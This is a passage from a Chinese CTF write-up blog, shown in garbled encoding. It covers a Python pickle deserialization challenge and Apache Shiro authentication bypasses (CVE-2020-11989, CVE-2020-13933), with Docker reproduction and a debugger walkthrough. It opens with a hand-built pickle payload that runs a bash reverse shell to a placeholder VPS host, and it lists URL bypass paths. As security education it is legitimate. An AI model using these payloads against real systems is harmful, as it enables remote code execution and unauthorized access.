&lt;/code>&lt;/pre>&lt;/div>&lt;p>‰∏Ä‰∏™ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÁÇπÊòØÁî±‰∫éËøôÈáåÁöÑÂèçÂ∫èÂàóÂåñÂÖ•Âè£ÊòØget‰º†ÂèÇÔºåÊâÄ‰ª•ÈÅáÂà∞+Âè∑‰ºöÂá∫ÈóÆÈ¢òÔºå‰º†ËøõÂéª‰πãÂâçË¶ÅÂÖàurlencode(encode all special chars)&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÈ°∫Â∏¶ÁªÉ‰∏™ÊâãÔºåÊêì‰∏Ä‰∏™‰∏çÂê´&lt;code>b'R'&lt;/code>ÁöÑopcodeÔºàÁî®&lt;code>b'o'&lt;/code>‰ª£ÊõøÔºâ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;cconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">notadmin&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">admin&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">yes&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">scconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">backdoor&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">__import__(&amp;#34;os&amp;#34;).system(&amp;#34;bash -c &lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">exec bash -i &amp;amp;&amp;gt;/dev/tcp/you_vps_ip/port &amp;lt;&amp;amp;1&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#34;)&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">p3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0(g2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">g3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">o.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>‰º†ÂèÇÁöÑÊó∂ÂÄôËÆ∞ÂæóÂÜçurlencode‰∏Ä‰∏ã~~~&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚Äî‰πãÂâçÊàëÁöÑ&lt;a href="https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/">ÊÄªÁªìÁ¨îËÆ∞&lt;/a>Â∑≤ÁªèÁõ∏ÂΩìÂÖ®Èù¢‰∫Ü &lt;del>ÂèØ‰ª•Âá∫CTFÊïôÁßë‰π¶‰∫Ü233333&lt;/del>&lt;/p>
&lt;h2 id="jack-shiro">Jack-Shiro&lt;/h2>
&lt;p>Â±û‰∫éÊòØÂéüÈ¢ò‰∫ÜÂ±û‰∫éÊòØÂ±û‰∫éÊòØÂ±û‰∫éÊòØÁÉ§ÁÉÇ‰∫ÜÂ∑≤ÁªèÔºåÂèÇËßÅ &lt;a href="https://www.zhaoj.in/read-6859.html#WEB1_javaweb">[Á∫¢ÊòéË∞∑CTF 2021] JavaWeb&lt;/a> | &lt;a href="https://www.huamang.xyz/index.php/archives/99/">[Â§©ÁøºÊùØ 2021] jackson&lt;/a> | &lt;a href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiro">[NPUCTF2020] EzShiro&lt;/a> &lt;del>ÔºàËôΩÁÑ∂ÊàëËá™Â∑±Ê†πÊú¨Ê≤°ÂèëÁé∞ ÂÆûÂú®ÊòØÂÅöËøáÁöÑÈ¢òÂ§™Â∞ë‰∫Ü javaÊõ¥ÊòØ‰∏ç‰ºö ÊàëÁöÑ&lt;/del>&lt;/p>
&lt;p>/login‰∏ãÊúâ‰∏™ÁôªÂΩïÔºåÂõûÊòæ/jsonÔºåËøîÂõûÁöÑcookieÊúâ‰∏™rememberMe=deleteMeÔºåÂèØ‰ª•Áü•ÈÅìÊòØshiro&lt;/p>
&lt;p>ËÆøÈóÆ/jsonÔºåÂêéÈù¢‰ºöÂ∏¶‰∏ÄÂ†ÜgetËØ∑Ê±ÇÁöÑÂèÇÊï∞ÔºåÁî®/;/jsonÁªïËøáÔºàcve-2020-11989Ôºâ&lt;/p>
&lt;p>‰∏äÂ∑•ÂÖ∑&lt;a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0">JNDI-Injection-Exploit&lt;/a>‰∏ÄÊääÊ¢≠ÔºàÈóÆÈ¢òÂá∫Âú®Êàëvps‰∏äÊ≤°ÊúâjavaÁéØÂ¢É Á´ØÂè£ËΩ¨ÂèëÂèàÂ§Ñ‰∫Ü‰∫øÁÇπÁÇπÈóÆÈ¢ò‚Ä¶‚Ä¶ ÊâÄ‰ª•Ê≤°ÊúâÂ∏¶Âá∫Êù•flagÔºâÔºåÊòØcve-2020-36188&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024041750586.png" alt="image-20211024041750586">&lt;/p>
&lt;p>Âì≠Âì≠&lt;/p>
&lt;p>ËøòÊúâ‰∏™Â∑•ÂÖ∑ÊòØ &lt;a href="https://github.com/Firebasky/LdapBypassJndi">LdapBypassJndi&lt;/a>ÔºåÂ∑Æ‰∏çÂ§öÁöÑÔºõ‰∏ãÈù¢ÊòØË∑ü‰∏ÄË∑üÊ∂âÂèäÂà∞ÁöÑÂá†‰∏™ÈìæÂ≠ê&lt;/p>
&lt;h3 id="cve-2020-11989">CVE-2020-11989&lt;/h3>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA">Apache ShiroÊùÉÈôêÁªïËøáÊºèÊ¥ûÂàÜÊûê(CVE-2020-11989)&lt;/a> | &lt;a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">Apache Shiro Ë∫´‰ªΩÈ™åËØÅÁªïËøáÊºèÊ¥û (CVE-2020-11989)&lt;/a>&lt;/p>
&lt;p>Apache ShiroÊòØ‰∏Ä‰∏™Â∏∏Áî®ÁöÑjavaÂÆâÂÖ®Ê°ÜÊû∂ÔºåÂú®1.5.3‰πãÂâçÁâàÊú¨‰∏≠ÂΩìShiro‰∏éSpringÂä®ÊÄÅÊéßÂà∂Âô®‰∏ÄËµ∑‰ΩøÁî®Êó∂ÔºàSpringÊ°ÜÊû∂‰∏≠Âè™Áî®ShiroÈâ¥ÊùÉÔºâÔºåÂ¶ÇÊûúÁõ¥Êé•ËÆøÈóÆ/shiro/admin/page‰ºö302Ë∑≥ËΩ¨Ë¶ÅÊ±ÇÁôªÂΩïÔºåËÄåËÆøÈóÆ/;shiro/admin/pageÂç≥ÂèØÁªïËøáÊùÉÈôêÈ™åËØÅÔºåËÆøÈóÆ/adminÁöÑ‰ø°ÊÅØ&lt;/p>
&lt;h4 id="Êú¨Âú∞ÁéØÂ¢ÉÊê≠Âª∫Â§çÁé∞">Êú¨Âú∞ÁéØÂ¢ÉÊê≠Âª∫&amp;amp;Â§çÁé∞&lt;/h4>
&lt;p>ÊúâÂ∏¶‰Ω¨Áõ¥Êé•ÂÜôÂ•ΩÁöÑdockerÂèØ‰ª•Áõ¥Êé•pullÊãøÊù•Áî®&lt;/p>
&lt;pre tabindex="0">&lt;code>docker pull jackey0/cve-2020-11989
docker run -p 8426:8080 &amp;lt;image&amp;gt; /bin/sh -c 'java -jar /springboot-shiro-0.0.1-SNAPSHOT.jar'
docker pull jackey0/cve-2020-13933
// docker start &amp;lt;container-id&amp;gt;
&lt;/code>&lt;/pre>&lt;p>ÊàñËÄÖ‰∏ãËΩΩ&lt;a href="https://github.com/l3yx/springboot-shiro">l3yx/springboot-shiro&lt;/a>È°πÁõÆÂà∞Êú¨Âú∞ÁºñËØë‰∏∫warÂåÖÔºàÊàñËÄÖ‰πüÊúâÁºñËØëÂ•ΩÁöÑ&lt;a href="https://github.com/backlion/demo/blob/master/shiro.war">shiro.war&lt;/a>Ôºâ‰πãÂêéÊâãÂä®ÊîæÂÖ•tomcat‰∏ãÁöÑwebappsÁõÆÂΩï‰∏ãËøêË°å„ÄÇÊòæÁÑ∂dockerÂ§™È¶ô‰∫ÜÔºÅÔºÅÔºÅÔºÅÔºÅ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025224051899.png" alt="image-20211025224051899">&lt;/p>
&lt;p>ËÆøÈóÆÊò†Â∞ÑÂà∞Â§ñÈÉ®ÁöÑ8426Á´ØÂè£ÔºåÁéØÂ¢ÉÊê≠Âª∫ÂÆåÊØï&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025224115269.png" alt="image-20211025224115269">&lt;/p>
&lt;p>postÊñπÂºèËØ∑Ê±Ç/doLoginÈ°µÈù¢ÔºåÁúãÂà∞cookie‰∏≠Âê´rememberMe=deleteMeÔºåÁ°ÆÂÆö‰∏∫shiro&lt;/p>
&lt;p>ËÆøÈóÆ/admin/pageÈ°µÈù¢Ôºå302ÈáçÂÆöÂêëËá≥/loginÈ°µÈù¢Ë¶ÅÊ±ÇÁôªÂΩï&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025232735464.png" alt="image-20211025232735464">&lt;/p>
&lt;p>ËÆøÈóÆ/;/admin/pageÈ°µÈù¢ÔºåÁªïËøáÈâ¥ÊùÉÔºåÂõûÊòæadmin page&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025232717422.png" alt="image-20211025232717422">&lt;/p>
&lt;h4 id="Ê∫êÁ†ÅÂàÜÊûêÂä®Ë∞É">Ê∫êÁ†ÅÂàÜÊûê&amp;amp;Âä®Ë∞É&lt;/h4>
&lt;p>ÂÖàÊääjarÂåÖ‰∏ãËΩΩÂà∞Âú®Êú¨Âú∞ÔºåÂØºÂÖ•idea&lt;/p>
&lt;pre tabindex="0">&lt;code>docker cp &amp;lt;container-id&amp;gt;:/springboot-shiro-0.0.1-SNAPSHOT.jar /home/name/t3mp/
&lt;/code>&lt;/pre>&lt;p>‰ΩøÁî®ideaËøúÁ®ãÂØπdocker‰∏≠ÈÉ®ÁΩ≤ÁöÑspringbootÈ°πÁõÆËøõË°ådebug&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026033544920.png" alt="image-20211026033544920">&lt;/p>
&lt;pre tabindex="0">&lt;code>docker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c 'java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar'
&lt;/code>&lt;/pre>&lt;p>ShiroÁöÑÊùÉÈôêÊ†°È™åÊòØÈÄöËøáÂà§Êñ≠urlÁöÑÂåπÈÖçÊù•ËøõË°åÁöÑÔºåÂ¶ÇÊûúShiroËé∑ÂèñÁöÑurlÂíåwebÊ°ÜÊû∂Â§ÑÁêÜÁöÑurlÁªìÊûú‰∏ç‰∏ÄËá¥Êó∂Â∞±ÈÄ†Êàê‰∫ÜÊùÉÈôêÁªïËøáÔºõShiroÂØπ‰∫éurlÁöÑËé∑ÂèñÂíåÂåπÈÖçÂú®&lt;code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain&lt;/code>‰∏≠ËøõË°å„ÄÇ&lt;/p>
&lt;p>‰ª•ËÆøÈóÆ/;/admin/page‰∏∫‰æãÔºåÈÄöËøáÂÆÉÁöÑ&lt;code>getPathWithinApplication()&lt;/code>ÂæóÂà∞ÁöÑrequestURI=&amp;quot;/&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026105323534.png" alt="image-20211026105323534">&lt;/p>
&lt;p>Ë∑üÂÖ•Ê≠§ÂáΩÊï∞ÁöÑÂ§ÑÁêÜÈÄªËæë&lt;code>org.apache.shiro.web.util.WebUtils#getPathWithinApplication&lt;/code>ÔºåËøõÂÖ•&lt;code>getRequestUri()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026113806371.png" alt="image-20211026113806371">&lt;/p>
&lt;p>Êàë‰ª¨ÂèØ‰ª•ÁúãÂà∞Âú®‰∏≠Èó¥ËøáÁ®ã‰∏≠uri=&amp;quot;/;/admin/page&amp;quot;Ôºå‰ΩÜÊòØ‰ªé‰∏äÈù¢Êàë‰ª¨ÂèØ‰ª•Áü•ÈÅìÁªèËøá&lt;code>normalize(decodeCleanUriString())&lt;/code>Â§ÑÁêÜËøáÂêéËøîÂõûÁöÑrequestRUI=&amp;quot;/&amp;quot;ÔºåË∑üÂÖ•Ëøô‰∏™ÂáΩÊï∞ÔºåÂÆÉÂÖàÊòØË∞ÉÁî®&lt;code>decodeRequestSrting()&lt;/code>ÔºåÊ≤°ÊúâÂØπÁªìÊûú‰∫ßÁîü‰ªÄ‰πàÂΩ±ÂìçÔºå&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026114857281.png" alt="image-20211026114857281">&lt;/p>
&lt;p>ËÄåËøîÂõûÊó∂ÁöÑ&lt;code>normalize()&lt;/code>‰ºöÊ†πÊçÆ&amp;quot;;&amp;ldquo;ËøõË°åurlÁöÑÊà™Êñ≠Â§ÑÁêÜÔºåÊúÄÁªàËøîÂõû&amp;rdquo;/&amp;quot;&lt;/p>
&lt;p>ÂõûÂà∞ÂºÄÂ§¥ÁöÑ/;/admin/pageËØ∑Ê±ÇÔºåspring‰∏≠Â§ÑÁêÜurlÁöÑÂáΩÊï∞Âú®&lt;code>org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026115653673.png" alt="image-20211026115653673">&lt;/p>
&lt;p>ÂÆÉË∞ÉÁî®ÁöÑÊòØspringframework‰∏≠Ëá™Â∑±&lt;code>getPathWithinApplication()&lt;/code>ÔºåÁªèËøá‰∏ÄÁï™È™öÊìç‰ΩúËøîÂõûÁöÑÊòØ/admin/page&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026115916664.png" alt="image-20211026115916664">&lt;/p>
&lt;p>Ë∑üÂÖ•&lt;code>getPathWitinApplication()&lt;/code>ÔºåÂÖàÊòØË∞ÉÁî®&lt;code>getContextPath()&lt;/code>ÔºåËøîÂõû&amp;quot;/&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026120922475.png" alt="image-20211026120922475">&lt;/p>
&lt;p>ÁÑ∂ÂêéÊòØ&lt;code>getRequestUri()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026121402778.png" alt="image-20211026121402778">&lt;/p>
&lt;p>ÂêåÊ†∑ÔºåÂú®ÊúÄÁªàreturn‰πãÂâçÁöÑuri=&amp;quot;/;/admin/page&amp;quot;ÔºåÁªèËøá‰∫Ü‰∏Ä‰∏™&lt;code>decodeAndCleanUriString()&lt;/code>ÔºåÊ†πÊçÆch=59‰πüÂ∞±ÊòØ&amp;quot;;&amp;ldquo;Á¨¶ËøõË°å‰∏Ä‰∏™ÂàÜÂâ≤Ôºå‰ΩøÁî®&lt;code>removeSemicolonContentInternal()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026121749767.png" alt="image-20211026121749767">&lt;/p>
&lt;p>‰∫éÊòØ&amp;rdquo;;&amp;ldquo;Â∞±‰∏çËßÅ‰∫Ü&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122016422.png" alt="image-20211026122016422">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122121074.png" alt="image-20211026122121074">&lt;/p>
&lt;p>ÁÑ∂ÂêéËøîÂõû&amp;rdquo;/admin/page&amp;quot;Áªô&lt;code>getPathWithinApplication()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122204403.png" alt="image-20211026122204403">&lt;/p>
&lt;p>ÂÜç‰º†ÈÄíÁªô&lt;code>getPathWithinServletMapping()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122355835.png" alt="image-20211026122355835">&lt;/p>
&lt;p>ÊúÄÁªàÊàë‰ª¨ËÆøÈóÆÂà∞ÁöÑÈ°µÈù¢Â∞±ÊòØ&amp;quot;/admin/page&amp;quot;‰∫Ü&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÊÄªÁªì‰∏Ä‰∏ãÂ∞±ÊòØÂΩìurlÂú®shiroÂíåspring‰∏≠ÁöÑÂ§ÑÁêÜ‰∏ç‰∏ÄËá¥ÔºåÂΩìËøõÂÖ•Â∫îÁî®Êó∂Ë¢´ËÆ§‰ΩúÊòØËÆøÈóÆ&amp;quot;/;/admin/page&amp;quot;Ôºå‰∏çÂ±û‰∫éÊàë‰ª¨ÊúÄÂàùÈÖçÁΩÆÁöÑ&amp;quot;/admin/*&amp;ldquo;ÊùÉÈôêË∑ØÁî±ÔºåËÄåËøõÂÖ•shiroÂêéÂç¥Ë¢´Êà™Êñ≠Â§ÑÁêÜÔºåËÆ§‰ΩúÊòØ&amp;rdquo;/admin/page&amp;quot;ÔºåÂ±û‰∫éÊùÉÈôêË∑ØÁî±‰∏≠ÔºåÊúÄÁªàÂÅöÂà∞ÊùÉÈôêÁªïËøá&lt;/p>
&lt;h3 id="cve-2020-13933">CVE-2020-13933&lt;/h3>
&lt;p>Áî±‰∫é11989ÁöÑ‰øÆË°•Âπ∂‰∏çÂÆåÂÖ®ÔºåÂØºËá¥ÂèàÂèàÂèàË¢´ÁªïËøá‰∫ßÁîü‰∫Ü13933‚Ä¶‚Ä¶&lt;/p>
&lt;h4 id="Êú¨Âú∞ÁéØÂ¢ÉÊê≠Âª∫Â§çÁé∞-1">Êú¨Âú∞ÁéØÂ¢ÉÊê≠Âª∫&amp;amp;Â§çÁé∞&lt;/h4>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://www.anquanke.com/post/id/214964#h2-3">shiro &amp;lt; 1.6.0ÁöÑËÆ§ËØÅÁªïËøáÊºèÊ¥ûÂàÜÊûê(CVE-2020-13933)&lt;/a>&lt;/p>
&lt;p>ËøòÊòØÈááÁî®dockerÂΩ¢ÂºèÂ§çÁé∞ÔºàÊàëÁà±dockerÔºâËøôÈáåÁõ¥Êé•Â∞±ÊòØËøúÁ®ãË∞ÉËØïÁöÑÂêØÂä®ÂëΩ‰ª§Âï¶ÔºåË∑ü‰∏äÈù¢ÁöÑ‰∏ÄÊ†∑ÈÖçÁΩÆÂ∞±Â•Ω‰∫ÜÔºà&lt;/p>
&lt;pre tabindex="0">&lt;code>docker pull jackey0/cve-2020-13933
docker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c 'java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar'
&lt;/code>&lt;/pre>&lt;p>ËÆøÈóÆ/adminÔºåÊä•ÈîôÈ°µÈù¢‰∏îÊó†302Ë∑≥ËΩ¨ÔºõËÆøÈóÆ/loginË∑≥ËΩ¨Âà∞Ë∫´‰ªΩÈ™åËØÅÈ°µÈù¢ÔºõËÆøÈóÆ/admin/%3bpageÔºåÊó†Ë∫´‰ªΩÈ™åËØÅ‰∏îËøîÂõûadmin page&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026171901636.png" alt="image-20211026171901636">&lt;/p>
&lt;h4 id="ÂéüÁêÜÂàÜÊûêÂä®Ë∞É">ÂéüÁêÜÂàÜÊûê&amp;amp;Âä®Ë∞É&lt;/h4>
&lt;p>ËøòÊòØÂØºÂÖ•jarÂåÖËá≥ideaÔºåËøúÁ®ãdebug&lt;/p>
&lt;p>Áõ¥Êé•ÁúãÁúãshiro1.6.0ÁöÑË°•‰∏ÅË°•Âà∞‰∫Ü‰ªÄ‰πàÂú∞ÊñπÔºåÂú®github‰∏äÊü•Áúã&lt;a href="https://github.com/apache/shiro/compare/shiro-root-1.5.3...shiro-root-1.6.0">diff&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026175139677.png" alt="image-20211026175139677">&lt;/p>
&lt;p>Â¢ûÂä†‰∫Ü&lt;code>InvalidRequestFilter&lt;/code>Á±ªÔºåÊúâ‰∏™&lt;code>isAccessAllowed()&lt;/code>ÂáΩÊï∞ÔºåÂú®ÂÖ®Â±Ä‰∏äÂØπÂàÜÂè∑„ÄÅÂèçÊñúÊù†„ÄÅÈùûASCIIÁ†ÅÂ≠óÁ¨¶ËøõË°å‰∫ÜËøáÊª§&lt;/p>
&lt;p>‰ª•ËÆøÈóÆ/admin/%3bpage‰∏∫‰æãÔºåurlÂÖàÁî±shiroËß£ÊûêÔºåËøòÊòØ&lt;code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain&lt;/code>Ôºå‰æùÊóßÊòØË∞ÉÁî®&lt;code>getPathWithinApplication()&lt;/code>ÔºåÊâßË°åÂêérequestURI=&amp;quot;/admin/&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026181015088.png" alt="image-20211026181015088">&lt;/p>
&lt;p>ËÄå‰πãÂêéËøõÂÖ•springbootÂ§ÑÁêÜÊó∂ÔºåÂç¥ÂèòÊàê‰∫Ü&amp;quot;/admin/;page&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026181252374.png" alt="image-20211026181252374">&lt;/p>
&lt;p>ÂÜçÂõûÂà∞ÊúÄÂàùË∑ü‰∏Ä‰∏ãÂÖ∑‰ΩìÁöÑË∞ÉÁî®Èìæ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026182540363.png" alt="image-20211026182540363">&lt;/p>
&lt;p>Âú®&lt;code>removeSemicolon()&lt;/code>Â§ÑÁêÜÂâçÔºåuri=&amp;quot;/admin/;page&amp;quot;ÔºàÁªè&lt;code>decodeAndUriString()&lt;/code>Ëß£Á†Å‰∫ÜÔºâ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026182711164.png" alt="image-20211026182711164">&lt;/p>
&lt;p>Â§ÑÁêÜÂêépath=&amp;quot;/admin&amp;quot;ÔºåÊé•ÁùÄË∞ÉÁî®&lt;code>normalize()&lt;/code>ÂáΩÊï∞ÂèòÊàê&amp;quot;/admin&amp;quot;Ôºå‰º†ÈÄíÁªôÊúÄÂàùÁöÑ&lt;code>getChain()&lt;/code>‰∏≠ÁöÑrequestURIÂèÇÊï∞&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026183041350.png" alt="image-20211026183041350">&lt;/p>
&lt;p>‰πãÂêéË¢´springÂ§ÑÁêÜ&lt;code>org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping&lt;/code>ÔºåÂÖ∂‰∏≠‰ºöË∞ÉÁî®&lt;code>getRequestUri()&lt;/code>ÔºåÂÆÉ‰ºöÂÜçÊ¨°Ë∞ÉÁî®&lt;code>decodeAndCleanUriString()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026183542060.png" alt="image-20211026183542060">&lt;/p>
&lt;p>ÂÖà&lt;code>removeSemicolonContent()&lt;/code>ÂÜç&lt;code>decodeRequestString()&lt;/code>ÔºåÈÇ£ÊòæÁÑ∂ÊòØÊÄé‰πàÈÉΩÂéª‰∏çÊéâ&amp;quot;;&amp;ldquo;‰∫ÜÔºåÂ∞Ü&amp;rdquo;;page&amp;quot;Áúã‰Ωú‰∏Ä‰∏™Êï¥‰Ωì&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026184529505.png" alt="image-20211026184529505">&lt;/p>
&lt;p>Êàë‰ª¨ÂõûËøáÂ§¥ÂéªÁúãËøôÊ¨°ÁöÑÊùÉÈôêËÆæÁΩÆÊòØÊÄé‰πàÂåπÈÖçurlÁöÑÔºåÂÆö‰ΩçÂà∞&lt;code>org.syclover.srpingbootshiro.LoginController&lt;/code>Âíå&lt;code>org.syclover.srpingbootshiro.ShiroConfig#shiroFilterFactoryBean&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026190414964.png" alt="image-20211026190414964">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026190401468.png" alt="image-20211026190401468">&lt;/p>
&lt;p>ÂèØ‰ª•ÁúãÂà∞ÔºåÂØπ‰∫é&amp;quot;/admin/*&amp;ldquo;ÈúÄË¶ÅÈâ¥ÊùÉÔºå&amp;quot;/admin/{name}&amp;ldquo;ËøîÂõûadmin pageÔºåËÄåÂØπ‰∫é&amp;rdquo;/admin/&amp;ldquo;Âç¥Ê≤°ÊúâËÆæÁΩÆÊùÉÈôê&lt;/p>
&lt;p>‰ªé‰∏äÈù¢ÁöÑË∞ÉËØï‰∏≠Êàë‰ª¨Áü•ÈÅìshiroÂæóÂà∞ÁöÑÊòØ&amp;rdquo;/admin/&amp;quot;ÔºàÂÖàdecodeÂÜçÂéªÈô§&amp;rdquo;;&amp;quot;ÔºâÔºåË¢´ËÆ§‰ΩúÂèØ‰ª•ËÆøÈóÆÔºõËÄåspringÂæóÂà∞ÁöÑÊòØ&amp;quot;/admin/;page&amp;quot;ÔºâÂÖàÂéªÈô§&amp;quot;;&amp;ldquo;ÂÜçdecodeÔºâÔºå‰∏é&amp;rdquo;/admin/{name}&amp;ldquo;ÁöÑÊ†∑ÂºèÂåπÈÖçÔºåÊúÄÂêéËøîÂõûadmin page &lt;del>ÔºàÁÆÄÁõ¥Â§™ÂÆåÁæé‰∫Ü‰πü&lt;/del>&lt;/p>
&lt;h4 id="‰∏¥Êó∂‰øÆÂ§ç">*‰∏¥Êó∂‰øÆÂ§ç&lt;/h4>
&lt;p>ÔºàÊú¨Âú∞ÊöÇÊó∂ËøòÊú™Â§çÁé∞&lt;/p>
&lt;pre tabindex="0">&lt;code>map.put(&amp;quot;/admin/**&amp;quot;, &amp;quot;authc&amp;quot;);
@GetMapping({&amp;quot;/admin/page&amp;quot;})
public String admin() {
return &amp;quot;admin page&amp;quot;;
}
&lt;/code>&lt;/pre>&lt;h3 id="cve-2020-36188">***CVE-2020-36188&lt;/h3>
&lt;p>&lt;code>ch.qos.logback.core.db.JNDIConnectionSource&lt;/code>&lt;/p>
&lt;p>ÂèØ‰ª•ÂèÇËÄÉ &lt;a href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiro">https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiro&lt;/a>ÔºåÂ∑•ÂÖ∑ &lt;a href="https://github.com/Firebasky/LdapBypassJndi">LdapBypassJndi&lt;/a> | &lt;a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit&lt;/a>&lt;/p>
